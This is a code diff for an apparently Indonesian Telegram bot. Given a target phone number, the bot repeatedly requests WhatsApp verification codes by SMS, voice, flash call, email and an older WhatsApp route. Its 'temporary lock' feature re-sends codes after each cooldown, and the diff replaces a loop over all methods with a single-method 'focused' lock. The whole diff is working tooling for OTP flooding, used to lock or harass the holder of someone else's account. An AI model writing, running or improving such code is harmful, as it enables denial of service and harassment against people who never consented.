@@ -80,6 +80,7 @@ const adminState = new Map();
 const keyboardMsgIds = new Map();
 const activeInlineMsg = new Map();
 const pendingSendPhone = new Map();
+const pendingSendMethod = new Map();
 const today = () => new Date().toISOString().slice(0, 10);
 
 function btn(text, callback_data, style = null) {
@@ -2103,6 +2104,7 @@ bot.action("cancel_send", async (ctx) => {
   const userId = ctx.from.id;
   awaitingSendInput.delete(userId);
   pendingSendPhone.delete(userId);
+  pendingSendMethod.delete(userId);
   await ctx.answerCbQuery("ᴅɪʙᴀᴛᴀʟᴋᴀɴ");
   await showPlainPanel(ctx, await buildDashboard(userId, ctx.from), false);
 });
@@ -2136,9 +2138,53 @@ function buildSendMethodKeyboard(phone, probe) {
   if (!(m.email > 0)) row2.push(btn("ᴇᴍᴀɪʟ", "send_email", "success"));
   if (row1.length) rows.push(row1);
   if (row2.length) rows.push(row2);
-  rows.push([btn("🔒 ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ", "send_lock_start", "danger")]);
+  if (!(m.sms > 0)) rows.push([btn("🔒 ᴋᴜɴᴄɪ ꜱᴍꜱ", "send_lock_sms", "danger")]);
+  if (dev && !(m.wa_old > 0)) rows.push([btn("🔒 ᴋᴜɴᴄɪ ᴡᴀ_ᴏʟᴅ", "send_lock_wa_old", "danger")]);
+  if (!(m.email > 0)) rows.push([btn("🔒 ᴋᴜɴᴄɪ ᴇᴍᴀɪʟ", "send_lock_email", "danger")]);
   rows.push([btn("✕ ʙᴀᴛᴀʟᴋᴀɴ", "cancel_send", "danger")]);
   return inlineKb(rows);
+}
+
+async function runFocusedLock(ctx, phone, method) {
+  const userId = ctx.from.id;
+  pendingSendPhone.set(userId, phone);
+  pendingSendMethod.set(userId, method);
+
+  await editInline(ctx, [
+    "🔒 ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ",
+    "",
+    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
+    `▸ ꜰᴏᴋᴜꜱ ⦂ ${methodLabel(method)}`,
+    "▸ ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ...</blockquote>"
+  ].join("\n"), inlineKb([]));
+
+  const res = await sendVerificationCode(phone, method, { skipProbe: false });
+  const methods = res.methods || (res.probe && res.probe.methods) || {};
+  const devOn = Boolean(res.isDeviceOn || (res.probe && res.probe.isDeviceOn));
+  const cd = Number(res.cooldownSeconds || 0);
+
+  const statusLine = res.success
+    ? "ᴛᴇʀᴋɪʀɪᴍ"
+    : (res.state === "COOLDOWN" ? `ᴊᴇᴅᴀ ${formatCooldown(cd)}` : esc(res.error || res.state || "ɢᴀɢᴀʟ"));
+
+  await editInline(ctx, [
+    "🔒 ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ — ꜰᴏᴋᴜꜱ " + methodLabel(method),
+    "",
+    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(res.phone || phone)}</code>`,
+    `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}`,
+    `▸ ʜᴀꜱɪʟ ⦂ ${statusLine}`,
+    `▸ ᴘᴇʀᴀɴɢᴋᴀᴛ ⦂ ${devOn ? "● ᴏɴ" : "○ ᴏꜰꜰ"}</blockquote>`,
+    "",
+    "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
+    `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`,
+    "",
+    cd > 0
+      ? `ⓘ ᴊᴇᴅᴀ ~${formatCooldown(cd)}. ᴛᴀᴘ <b>↻ ᴋɪʀɪᴍ ᴜʟᴀɴɢ</b> ꜱᴇᴛᴇʟᴀʜ ᴊᴇᴅᴀ.`
+      : "ⓘ ᴛᴀᴘ <b>↻ ᴋɪʀɪᴍ ᴜʟᴀɴɢ</b> ᴜɴᴛᴜᴋ ᴋɪʀɪᴍ ʟᴀɢɪ ᴋᴇ ᴍᴇᴛᴏᴅᴇ ʏᴀɴɢ ꜱᴀᴍᴀ."
+  ].join("\n"), inlineKb([
+    [btn("↻ ᴋɪʀɪᴍ ᴜʟᴀɴɢ", "send_lock_continue", "danger")],
+    [btn("✕ ꜱᴛᴏᴘ", "send_lock_stop", "primary")]
+  ]));
 }
 
 bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
@@ -2149,6 +2195,7 @@ bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
   if (!phone) {
     return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ ᴋɪʀɪᴍ ᴋᴏᴅᴇ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
   }
+  pendingSendMethod.set(userId, method);
   await editInline(ctx, [
     "✧ ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ...",
     "",
@@ -2156,7 +2203,7 @@ bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
     `▸ ᴍᴇᴛᴏᴅᴇ ⦂ ${methodLabel(method)}</blockquote>`
   ].join("\n"), inlineKb([]));
 
-  const res = await sendVerificationCode(phone, method);
+  const res = await sendVerificationCode(phone, method, { skipProbe: false });
   const probe = res.probe || {};
   const methods = res.methods || probe.methods || {};
   const lines = [
@@ -2173,7 +2220,7 @@ bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
   if (res.success) {
     if (res.maskedEmail) lines.push(`▸ ᴇᴍᴀɪʟ ⦂ <code>${esc(res.maskedEmail)}</code>`);
     if (res.cooldownSeconds > 0) lines.push(`▸ ᴊᴇᴅᴀ ꜱᴇᴛᴇʟᴀʜ ᴋɪʀɪᴍ ⦂ ${formatCooldown(res.cooldownSeconds)}`);
-    lines.push("", "ⓘ ᴋᴏᴅᴇ ᴅɪᴋɪʀɪᴍ ᴠɪᴀ ᴇɴᴅᴘᴏɪɴᴛ ʀᴇꜱᴍɪ ᴡᴀ. ᴄᴇᴋ ᴘᴇʀᴀɴɢᴋᴀᴛ ᴛᴀʀɢᴇᴛ.");
+    lines.push("", "ⓘ ᴋᴏᴅᴇ ᴅɪᴋɪʀɪᴍ ʟᴇᴡᴀᴛ ᴇɴᴅᴘᴏɪɴᴛ ʀᴇꜱᴍɪ ᴡᴀ.");
   } else {
     lines.push(`▸ ᴀʟᴀꜱᴀɴ ⦂ ${esc(res.error || res.reason || "gagal")}`);
     if (res.cooldownSeconds > 0) lines.push(`▸ ᴄᴏʙᴀ ʟᴀɢɪ ⦂ ${formatCooldown(res.cooldownSeconds)}`);
@@ -2182,116 +2229,26 @@ bot.action(/^send_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
   await editInline(ctx, lines.join("\n"), buildSendMethodKeyboard(phone, { methods, isDeviceOn: res.isDeviceOn || probe.isDeviceOn }));
 });
 
-bot.action("send_lock_start", async (ctx) => {
+bot.action(/^send_lock_(sms|voice|flash|email|wa_old)$/i, async (ctx) => {
   const userId = ctx.from.id;
+  const method = String(ctx.match[1] || "sms").toLowerCase();
   const phone = pendingSendPhone.get(userId);
   await ctx.answerCbQuery();
   if (!phone) {
     return editInline(ctx, "⚠ ɴᴏᴍᴏʀ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
   }
-  await editInline(ctx, [
-    "🔒 ᴍᴇᴍᴜʟᴀɪ ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ...",
-    "",
-    `<blockquote>▸ ᴛᴀʀɢᴇᴛ ⦂ <code>${esc(phone)}</code>`,
-    "▸ ᴜʀᴜᴛᴀɴ ⦂ ᴡᴀ_ᴏʟᴅ → ᴇᴍᴀɪʟ → ꜱᴍꜱ → ᴠᴏɪᴄᴇ → ꜰʟᴀꜱʜ</blockquote>"
-  ].join("\n"), inlineKb([]));
-
-  const priority = ["wa_old", "email", "sms", "voice", "flash"];
-  let lastRes = null;
-  let sentCount = 0;
-  const log = [];
-
-  for (const method of priority) {
-    const res = await sendVerificationCode(phone, method);
-    lastRes = res;
-    if (res.success) {
-      sentCount++;
-      log.push(`✦ ${methodLabel(method)} ⦂ ᴛᴇʀᴋɪʀɪᴍ` + (res.cooldownSeconds ? ` · ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds)}` : ""));
-    } else if (res.state === "COOLDOWN" || res.error === "method_cooldown") {
-      log.push(`◐ ${methodLabel(method)} ⦂ ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds || 0)}`);
-    } else {
-      log.push(`○ ${methodLabel(method)} ⦂ ${esc(res.error || res.state || "skip")}`);
-    }
-  }
-
-  const methods = (lastRes && (lastRes.methods || (lastRes.probe && lastRes.probe.methods))) || {};
-  const devOn = Boolean(lastRes && (lastRes.isDeviceOn || (lastRes.probe && lastRes.probe.isDeviceOn)));
-  const jobKey = `lockjob:${userId}:${String(phone).replace(/\D/g, "")}`;
-  const minWait = Math.min(
-    ...["sms", "voice", "flash", "email", "wa_old"].map(k => (methods[k] > 0 ? methods[k] : 999999))
-  );
-  const nextAt = Date.now() + (Number.isFinite(minWait) && minWait < 999999 ? minWait * 1000 : 60000);
-  await redis.set(jobKey, JSON.stringify({
-    userId,
-    phone,
-    priority,
-    sentCount,
-    nextAt,
-    active: true,
-    updatedAt: Date.now()
-  }), { ex: 86400 });
-
-  await editInline(ctx, [
-    "🔒 ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴀᴋᴛɪꜰ",
-    "",
-    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
-    `▸ ᴛᴇʀᴋɪʀɪᴍ ꜱᴇᴋᴀʀᴀɴɢ ⦂ ${sentCount} ᴍᴇᴛᴏᴅᴇ`,
-    `▸ ʟᴀɴᴊᴜᴛ ᴏᴛᴏᴍᴀᴛɪꜱ ꜱᴀᴀᴛ ᴊᴇᴅᴀ ꜱᴇʟᴇꜱᴀɪ</blockquote>`,
-    "",
-    "◈ ʟᴏɢ ᴋɪʀɪᴍ",
-    `<blockquote>${log.join("\n") || "—"}</blockquote>`,
-    "",
-    "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
-    `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`,
-    "",
-    "ⓘ ᴛᴀᴘ <b>↻ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴋᴜɴᴄɪ</b> ꜱᴇᴛᴇʟᴀʜ ᴊᴇᴅᴀ ᴜɴᴛᴜᴋ ᴋɪʀɪᴍ ʟᴀɢɪ."
-  ].join("\n"), inlineKb([
-    [btn("↻ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴋᴜɴᴄɪ", "send_lock_continue", "danger")],
-    [btn("✕ ꜱᴛᴏᴘ ᴋᴜɴᴄɪ", "send_lock_stop", "primary")]
-  ]));
+  return runFocusedLock(ctx, phone, method);
 });
 
 bot.action("send_lock_continue", async (ctx) => {
   const userId = ctx.from.id;
   const phone = pendingSendPhone.get(userId);
+  const method = pendingSendMethod.get(userId) || "sms";
   await ctx.answerCbQuery();
   if (!phone) {
     return editInline(ctx, "⚠ ꜱᴇꜱɪ ᴋᴜɴᴄɪ ʜɪʟᴀɴɢ. ᴜʟᴀɴɢɪ ᴅᴀʀɪ ᴍᴇɴᴜ.", inlineKb([[btn("✕ ᴛᴜᴛᴜᴘ", "cancel_send", "danger")]]));
   }
-  await editInline(ctx, "↻ ᴍᴇᴍᴘʀᴏꜱᴇꜱ ᴘᴜᴛᴀʀᴀɴ ᴋᴜɴᴄɪ...", inlineKb([]));
-  const priority = ["wa_old", "email", "sms", "voice", "flash"];
-  let sentCount = 0;
-  const log = [];
-  let lastRes = null;
-  for (const method of priority) {
-    const res = await sendVerificationCode(phone, method);
-    lastRes = res;
-    if (res.success) {
-      sentCount++;
-      log.push(`✦ ${methodLabel(method)} ⦂ ᴛᴇʀᴋɪʀɪᴍ` + (res.cooldownSeconds ? ` · ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds)}` : ""));
-    } else if (res.cooldownSeconds > 0) {
-      log.push(`◐ ${methodLabel(method)} ⦂ ᴊᴇᴅᴀ ${formatCooldown(res.cooldownSeconds)}`);
-    } else {
-      log.push(`○ ${methodLabel(method)} ⦂ ${esc(res.error || res.state || "skip")}`);
-    }
-  }
-  const methods = (lastRes && (lastRes.methods || (lastRes.probe && lastRes.probe.methods))) || {};
-  const devOn = Boolean(lastRes && (lastRes.isDeviceOn || (lastRes.probe && lastRes.probe.isDeviceOn)));
-  await editInline(ctx, [
-    "🔒 ᴋᴜɴᴄɪ — ᴘᴜᴛᴀʀᴀɴ ʙᴀʀᴜ",
-    "",
-    `<blockquote>▸ ɴᴏᴍᴏʀ ⦂ <code>${esc(phone)}</code>`,
-    `▸ ᴛᴇʀᴋɪʀɪᴍ ⦂ ${sentCount} ᴍᴇᴛᴏᴅᴇ</blockquote>`,
-    "",
-    "◈ ʟᴏɢ",
-    `<blockquote>${log.join("\n")}</blockquote>`,
-    "",
-    "◈ ꜱᴛᴀᴛᴜꜱ ᴍᴇᴛᴏᴅᴇ",
-    `<blockquote>${formatMethodsBlock(methods, devOn)}</blockquote>`
-  ].join("\n"), inlineKb([
-    [btn("↻ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴋᴜɴᴄɪ", "send_lock_continue", "danger")],
-    [btn("✕ ꜱᴛᴏᴘ ᴋᴜɴᴄɪ", "send_lock_stop", "primary")]
-  ]));
+  return runFocusedLock(ctx, phone, method);
 });
 
 bot.action("send_lock_stop", async (ctx) => {
@@ -2302,6 +2259,7 @@ bot.action("send_lock_stop", async (ctx) => {
     await redis.del(`lockjob:${userId}:${String(phone).replace(/\D/g, "")}`).catch(() => {});
   }
   pendingSendPhone.delete(userId);
+  pendingSendMethod.delete(userId);
   await editInline(ctx, "✦ ᴋᴜɴᴄɪ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴅɪʜᴇɴᴛɪᴋᴀɴ.", inlineKb([[btn("✧ ᴋɪʀɪᴍ ʟᴀɢɪ", "cancel_send", "primary")]]));
 });
 
